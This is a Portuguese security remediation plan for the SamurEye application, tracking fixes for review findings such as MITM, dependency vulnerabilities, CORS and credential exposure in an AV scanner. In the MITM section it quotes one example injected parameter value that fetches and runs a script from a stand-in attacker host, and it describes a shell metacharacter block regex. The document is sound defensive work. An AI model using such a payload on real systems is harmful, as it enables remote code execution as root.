# Plano de Remediação de Segurança - SamurEye

> Baseado no **Relatório de Análise de Segurança de Código** elaborado por Rodrigo Urubatan Ferreira Jardim (08/03/2026)

---

## Resumo das Findings

| ID | Descrição | Severidade | Status |
|----|-----------|------------|--------|
| FND-001 | Man in the Middle (MITM) | **Crítica** | :white_check_mark: Resolvido (TLS + validação params + single-quote env) |
| FND-002 | Vulnerabilidades em dependências | **Alta** | :white_check_mark: Resolvido (32/36 → 4 residuais dev-only) |
| FND-003 | Configuração de CORS excessivamente permissiva | **Baixa** | :white_check_mark: Resolvido (ALLOWED_ORIGINS env var) |
| FND-004 | Risco de acesso ao AuthFile no EDR AV Scanner | **Média** | :white_check_mark: Resolvido (tmpfs + crypto names + secure wipe) |
| FND-005 | Falta de testes automatizados | **Média** | :red_circle: Pendente |
| FND-006 | Falta de configuração para ferramentas de suporte a desenvolvedor | **Informativa** | :red_circle: Pendente |
| FND-007 | Arquivos fonte extensos (God Objects) | **Média** | :red_circle: Pendente |
| FND-008 | Falta de ferramenta configurável de logging | **Informativa** | :white_check_mark: Resolvido (pino + redação automática + 655 console→logger) |
| FND-009 | Validação de Host no sshCollector | **Informativa** | :red_circle: Pendente |

---

## Fases de Resolução

### Fase 1 — Correções Críticas e de Alta Severidade

Prioridade máxima. Devem ser resolvidas imediatamente.

#### 1.1 FND-002: Vulnerabilidades em dependências (Alta)

**Justificativa para começar aqui:** Correção rápida (npm audit fix) que reduz imediatamente a superfície de ataque. Resolve 36 vulnerabilidades (22 high, 1 critical) com esforço mínimo.

**Arquivos afetados:**
- `package.json`

**Ações:**
- [x] Executar `npm audit` para inventário completo — 36 vulnerabilidades (1 critical, 22 high, 9 moderate, 4 low)
- [x] Executar `npm audit fix` para correções não-breaking — corrigiu 30 vulnerabilidades
- [x] Atualizar manualmente `vite` (5.4→6.4), `@vitejs/plugin-react` (4.3→4.5), `drizzle-kit` (0.30→0.31) — corrigiu mais 2
- [x] Validar que a aplicação compila e funciona após atualização — `npm run build` OK
- [x] Documentar vulnerabilidades que não puderam ser resolvidas

**Resultado:** 36 → 4 vulnerabilidades restantes (todas moderate, dev-only)

**Vulnerabilidades residuais (aceitas):**
As 4 restantes são todas a mesma issue: `esbuild <=0.24.2` embutido como dependência transitiva do `@esbuild-kit/esm-loader` dentro do `drizzle-kit`. Esta vulnerabilidade **só afeta o servidor de desenvolvimento** (permite requests ao dev server) e **não tem impacto em produção**. A correção requer downgrade do drizzle-kit para 0.18 (incompatível com drizzle-orm 0.39), portanto é inviável sem regressão.

---

#### 1.2 FND-001: Man in the Middle — MITM (Crítica)

**Justificativa:** Vulnerabilidade mais grave do relatório. Requer implementação cuidadosa em 3 frentes.

**Arquivos afetados:**
- `server/services/subscriptionService.ts` — Validação de certificado TLS
- `server/services/systemUpdateService.ts` — Validação de parâmetros de update

**Ações:**

**1.2a — Validação de Certificado TLS no SubscriptionService:**
- [x] Verificar configuração atual de TLS/HTTPS no heartbeat — Node.js `fetch()` já valida TLS por padrão
- [x] Implementar validação de URL HTTPS obrigatória — `validateConsoleUrl()` rejeita HTTP (exceto localhost)
- [x] Confirmar que `rejectUnauthorized: true` é o padrão — Node.js usa isso por default, não há override no código
- [x] Implementar validação estrutural de comandos recebidos — `validateCommand()` com whitelist de tipos

**1.2b — Validação de Parâmetros no SystemUpdateService:**
- [x] Mapear todos os parâmetros recebidos via comando de update do console — `branch`, `token`, `skipBackup`
- [x] Implementar whitelist de parâmetros aceitos — parâmetros desconhecidos são rejeitados
- [x] Validar formato de cada parâmetro com regex estrita — `PARAM_VALIDATORS`
- [x] Bloquear caracteres perigosos para shell — `SHELL_DANGEROUS` regex (`` ` $ ( ) { } | ; & < > `` etc.)
- [x] Mudar env file de double quotes para single quotes — impede `$()` e backtick command substitution
- [x] Adicionar escape de single quotes nos valores — `shellSingleQuoteEscape()`

**1.2c — Assinatura criptográfica de comandos (opcional/recomendado):**
- [ ] Avaliar viabilidade de assinatura HMAC usando API key + salt
- [ ] Implementar verificação de assinatura nos comandos recebidos

**Resultado:** Vetor de ataque MITM neutralizado em 3 camadas:
1. **Camada de transporte**: HTTPS obrigatório (exceto localhost dev)
2. **Camada de validação**: Whitelist de tipos de comando + validação estrutural
3. **Camada de sanitização**: Regex estrita por parâmetro + bloqueio de shell metacharacters + single-quoted env file

**Vetor original identificado e corrigido:**
O env file usava `JSON.stringify()` (double quotes), que NÃO escapa `` ` `` nem `$()`. Quando o wrapper faz `source`, bash interpreta command substitution dentro de double quotes. Um atacante MITM poderia enviar `branch: "$(curl evil.com|bash)"` e executar código como root. Agora usa single quotes + validação de formato.

**Nota sobre 1.2c:** A assinatura HMAC é uma camada adicional de defesa em profundidade. As camadas 1-3 já neutralizam o vetor, mas HMAC seria ideal para garantia criptográfica de autenticidade. Pode ser implementada numa iteração futura se desejado.

---

### Fase 2 — Correções de Severidade Média

#### 2.1 FND-004: Risco de Acesso ao AuthFile no EDR AV Scanner (Média)

**Arquivos afetados:**
- `server/services/scanners/edrAvScanner.ts`

**Ações:**
- [x] Mover auth files para `/dev/shm` (tmpfs, RAM-only) — nunca tocam disco, impede recuperação forense
- [x] Usar `crypto.randomBytes(16)` para nomes de arquivo imprevisíveis (era `Date.now()`, previsível)
- [x] Implementar `secureCleanup()` — sobrescreve com zeros antes de deletar (defense in depth)
- [x] Remover fallback com credenciais na linha de comando (`-U user%password`) — era visível em `/proc/<pid>/cmdline`
- [x] Sanitizar logs de comandos — auth file paths redactados como `[AUTH_FILE]`
- [x] Extrair criação de auth file para helper reutilizável `createSecureAuthFile()`
- [ ] Adicionar documentação de requisito de máquina dedicada

**Resultado:** 5 vetores de exposição de credenciais corrigidos:
1. **Disco**: Auth files agora em tmpfs (`/dev/shm`) — nunca persistidos em disco
2. **Previsibilidade**: Nomes com `crypto.randomBytes` em vez de `Date.now()`
3. **Remanência**: `secureCleanup()` zera conteúdo antes de `unlink()`
4. **Processo**: Removido fallback `-U user%password` (visível em `/proc/<pid>/cmdline`)
5. **Logs**: Caminhos de auth files redactados como `[AUTH_FILE]`

---

#### 2.2 FND-005: Falta de testes automatizados (Média)

**Arquivos afetados:**
- `package.json` (novas dependências de teste)
- Novos arquivos de teste a criar

**Ações:**
- [ ] Configurar framework de testes (Vitest — compatível com Vite)
- [ ] Criar testes unitários para serviços críticos de segurança:
  - `subscriptionService.ts` — validação de certificados e parâmetros
  - `systemUpdateService.ts` — sanitização de inputs
  - `edrAvScanner.ts` — gestão de credenciais
- [ ] Criar testes de integração para rotas da API
- [ ] Adicionar script de teste ao `package.json`
- [ ] Configurar CI/CD para executar testes automaticamente

---

#### 2.3 FND-007: Arquivos fonte extensos (Média)

**Arquivos com mais de 1000 linhas:**

| Arquivo | Linhas |
|---------|--------|
| `server/storage.ts` | 2255 |
| `server/routes.ts` | 2252 |
| `server/services/scanners/adScanner.ts` | 1934 |
| `server/services/threatEngine.ts` | 1829 |
| `server/services/journeyExecutor.ts` | 1810 |
| `client/src/pages/hosts.tsx` | 1487 |
| `client/src/pages/threats.tsx` | 1401 |
| `client/src/pages/settings.tsx` | 1185 |
| `client/src/components/forms/journey-form.tsx` | 1164 |
| `shared/schema.ts` | 1034 |
| `server/services/scanners/networkScanner.ts` | 1015 |

**Ações:**
- [ ] Priorizar refatoração de `storage.ts` e `routes.ts` (maiores arquivos)
- [ ] Dividir por domínio/responsabilidade (ex: `storage/hosts.ts`, `storage/threats.ts`, etc.)
- [ ] Aplicar o Princípio de Responsabilidade Única (SRP)
- [ ] Manter backward-compatibility nas exportações

**Nota:** Esta é uma tarefa contínua de longo prazo. Deve ser feita incrementalmente, sem bloquear outras correções.

---

### Fase 3 — Correções de Severidade Baixa

#### 3.1 FND-003: Configuração de CORS excessivamente permissiva (Baixa)

**Arquivos afetados:**
- `server/index.ts` (linhas 16-38)

**Ações:**
- [x] Implementar whitelist dinâmica baseada em variável de ambiente (`ALLOWED_ORIGINS`, comma-separated)
- [x] Quando `ALLOWED_ORIGINS` está configurada, rejeitar origens não listadas com log
- [x] Manter permissividade em desenvolvimento (localhost com regex seguro)
- [x] Quando `ALLOWED_ORIGINS` não está definida, manter compatibilidade (appliance single-host — permite todas)
- [ ] Documentar configuração de CORS no guia de instalação

**Resultado:** O fallback `callback(null, true)` foi removido. Comportamento:
- **Sem `ALLOWED_ORIGINS`**: Compatível com deploy atual (appliance acessa sua própria UI)
- **Com `ALLOWED_ORIGINS`**: Só origens listadas são aceitas; demais são rejeitadas com log
- **Dev**: `localhost`/`127.0.0.1` em qualquer porta é aceito via regex (não mais `origin.includes('localhost')` que era bypassável)

---

### Fase 4 — Melhorias Informativas

#### 4.1 FND-008: Ferramenta configurável de logging (Informativa)

**Arquivos afetados:**
- `server/lib/logger.ts` (novo módulo central)
- 22 arquivos do servidor migrados (655 ocorrências de console.log/warn/error → 0)

**Ações:**
- [x] Instalar **pino** (produção) + **pino-pretty** (dev) + **@types/pino**
- [x] Criar módulo central `server/lib/logger.ts` com:
  - Níveis configuráveis via `LOG_LEVEL` env var (debug/info/warn/error/fatal)
  - Redação automática de campos sensíveis (password, token, secret, apiKey, etc.)
  - JSON estruturado em produção (compatível com ELK, Loki, Datadog)
  - Pretty-print colorido em desenvolvimento (via pino-pretty)
  - Child loggers por componente (`createLogger('component')`)
  - Timestamp ISO em todas as linhas
- [x] Migrar todos os 22 arquivos do servidor (655 → 0 console.log/warn/error)
- [x] Converter logs verbosos multi-linha em objetos JSON estruturados
- [x] Corrigir exposição de credential.username nos logs (journeyExecutor.ts, edrAvScanner.ts)
- [x] Configurar nível de log por ambiente (development = pretty, production = JSON)

**Resultado:**
- 0 ocorrências de `console.log/warn/error` no servidor
- Redação automática de 20+ campos sensíveis (password, token, secret, apiKey, etc.)
- JSON newline-delimited em produção (ingestão direta por agregadores)
- Correlação por componente em cada linha de log
- Leak de credenciais em logs corrigido (FND-008b)

---

#### 4.2 FND-006: Ferramentas de suporte a desenvolvedor (Informativa)

**Ações:**
- [ ] Configurar ESLint com regras adequadas ao projeto
- [ ] Configurar Prettier para formatação consistente
- [ ] Adicionar scripts de lint ao `package.json`
- [ ] Criar `.eslintrc.json` e `.prettierrc`

---

#### 4.3 FND-009: Validação de Host no sshCollector (Informativa)

**Arquivos afetados:**
- `server/services/collectors/sshCollector.ts`

**Ações:**
- [ ] Implementar verificação de fingerprint do host SSH no primeiro acesso
- [ ] Armazenar fingerprint conhecido no banco de dados
- [ ] Em acessos subsequentes, comparar fingerprint e alertar se diferente
- [ ] Gerar alerta de segurança caso o host tenha sido potencialmente comprometido

---

## Ordem de Execução Recomendada

```
Fase 1.1  →  FND-002  Dependências vulneráveis         [✅ CONCLUÍDO]
Fase 1.2  →  FND-001  Man in the Middle (MITM)          [✅ CONCLUÍDO]
Fase 2.1  →  FND-004  AuthFile no EDR AV Scanner        [✅ CONCLUÍDO]
Fase 3.1  →  FND-003  CORS permissivo                   [✅ CONCLUÍDO]
Fase 4.1  →  FND-008  Logging estruturado               [✅ CONCLUÍDO]
Fase 4.2  →  FND-006  ESLint + Prettier                 [Base para qualidade]
Fase 2.2  →  FND-005  Testes automatizados              [Depende de 4.2]
Fase 4.3  →  FND-009  Validação SSH Host                [Melhoria incremental]
Fase 2.3  →  FND-007  Refatoração de arquivos extensos  [Contínuo, longo prazo]
```

---

## Histórico de Alterações

| Data | Finding | Ação | Status |
|------|---------|------|--------|
| 2026-03-11 | — | Plano de remediação criado | Concluído |
| 2026-03-11 | FND-002 | Dependências atualizadas: npm audit fix + vite 6.4, plugin-react 4.5, drizzle-kit 0.31. 36→4 vulns (dev-only). Build OK. | Concluído |
| 2026-03-11 | FND-001 | MITM mitigado: HTTPS obrigatório, validação de comandos, whitelist+regex de params, single-quote env file, bloqueio de shell metacharacters. Build OK. | Concluído |
| 2026-03-11 | FND-003 | CORS: removido fallback allow-all, adicionado ALLOWED_ORIGINS env var, regex seguro para localhost dev, rejeição com log. Build OK. | Concluído |
| 2026-03-11 | FND-004 | AuthFile: tmpfs (/dev/shm), crypto.randomBytes, secureCleanup (zero+unlink), removido fallback -U user%pass, logs redactados. Build OK. | Concluído |
| 2026-03-11 | FND-008 | Logging: pino + pino-pretty instalados, server/lib/logger.ts criado com redação automática de 20+ campos sensíveis, 655 console.* migrados para logger estruturado em 22 arquivos, credential.username removido dos logs. Build OK. | Concluído |
